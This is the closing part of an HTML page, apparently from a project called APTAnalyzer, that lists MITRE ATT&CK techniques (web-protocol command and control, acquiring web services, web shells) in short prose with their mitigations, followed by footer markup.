                            <p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Acquire Infrastructure: Web Services</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Server Software Component: Web Shell</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) </p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
                            <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p></details>
                        </details>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
            
            
            <footer class="u-black u-border-3 u-border-custom-color-1 u-clearfix u-footer" id="sec-be64"><div class="u-clearfix u-sheet u-sheet-1">
                <div class="u-align-left u-social-icons u-spacing-10 u-social-icons-1">
                  <a class="u-social-url" target="_blank" data-type="Github" title="Github" href="https://github.com/redbeardmeric/APTAnalyzer"><span class="u-icon u-social-github u-social-icon u-icon-1"><svg class="u-svg-link" preserveAspectRatio="xMidYMin slice" viewBox="0 0 112 112" style=""><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#svg-2f65"></use></svg><svg class="u-svg-content" viewBox="0 0 112 112" x="0" y="0" id="svg-2f65"><circle fill="currentColor" cx="56.1" cy="56.1" r="55"></circle><path fill="#FFFFFF" d="M88,51.3c0-5.5-1.9-10.2-5.3-13.7c0.6-1.3,2.3-6.5-0.5-13.5c0,0-4.2-1.4-14,5.3c-4.1-1.1-8.4-1.7-12.7-1.8
                c-4.3,0-8.7,0.6-12.7,1.8c-9.7-6.6-14-5.3-14-5.3c-2.8,7-1,12.2-0.5,13.5C25,41.2,23,45.7,23,51.3c0,19.6,11.9,23.9,23.3,25.2
                c-1.5,1.3-2.8,3.5-3.2,6.8c-3,1.3-10.2,3.6-14.9-4.3c0,0-2.7-4.9-7.8-5.3c0,0-5-0.1-0.4,3.1c0,0,3.3,1.6,5.6,7.5c0,0,3,9.1,17.2,6
                c0,4.3,0.1,8.3,0.1,9.5h25.2c0-1.7,0.1-7.2,0.1-14c0-4.7-1.7-7.9-3.4-9.4C76,75.2,88,70.9,88,51.3z"></path></svg></span>
                  </a>
                  <a class="u-social-url" target="_blank" data-type="Github" title="MITRE Att&amp;ck" href="https://attack.mitre.org/"><span class="u-file-icon u-icon u-social-github u-social-icon u-icon-2"><img src="images/Attck.jpg" alt=""></span>
                  </a>
                </div>
              </div></footer>
            <section class="u-backlink u-clearfix u-grey-80">
              <a class="u-link" href="https://nicepage.com/templates" target="_blank">
                <span>Template</span>
              </a>
              <p class="u-text">
                <span>created with</span>
              </p>
              <a class="u-link" href="https://nicepage.com/html-website-builder" target="_blank">
                <span>HTML Website Builder</span>
              </a>. 
            </section>
          </body>
        </html>